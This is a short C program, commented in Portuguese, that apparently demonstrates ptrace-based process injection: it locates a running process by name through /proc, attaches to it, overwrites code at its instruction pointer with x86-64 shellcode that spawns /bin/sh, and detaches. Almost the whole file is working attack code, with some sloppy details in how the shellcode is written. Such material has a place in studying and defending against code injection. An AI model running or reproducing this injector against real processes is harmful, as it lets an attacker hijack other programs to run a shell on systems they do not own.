#include <stdio.h>
#include <stdint.h>
#include <wait.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/ptrace.h>
#include <sys/user.h>

int pidXNome(const char *name) {
    DIR *dir;
    struct dirent *entry;
    char path[256];
    char filename[256];
    char cmdline[256];
    FILE *fp;

    // Abre o diretório /proc
    dir = opendir("/proc");
    if (dir == NULL) {
        perror("opendir");
        exit(EXIT_FAILURE);
    }

    // Itera sobre todos os diretórios no diretório /proc
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            snprintf(path, sizeof(path), "/proc/%s/cmdline", entry->d_name);

            // Lê o conteúdo do arquivo cmdline do processo
            fp = fopen(path, "r");
            if (fp != NULL) {
                fgets(cmdline, sizeof(cmdline), fp);
                fclose(fp);

                // Verifica se o nome do processo corresponde ao nome desejado
                if (strstr(cmdline, name) != NULL) {
                    closedir(dir);
                    return atoi(entry->d_name);
                }
            }
        }
    }

    closedir(dir);
    return -1; // Retorna -1 se o processo não for encontrado
}

unsigned char *payload = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05";

int main(int argc, char *argv[]) {
    //pid_t pid = 8767;
    pid_t pid = pidXNome("process"); // Nome do processo
    size_t pLen = 0;

    while (payload[pLen] != '\0') {
        pLen++;
    }

    ptrace(PTRACE_ATTACH, pid, NULL,NULL);
    wait(NULL);
    
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);

    uint32_t *s = (uint32_t *) payload;
    uint32_t *d = (uint32_t *) regs.rip;

    for (int i=0; i < pLen; i+=4, s++,d++) {
	    ptrace(PTRACE_POKETEXT, pid, d, *s);
    }

    regs.rip +=2;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;
}
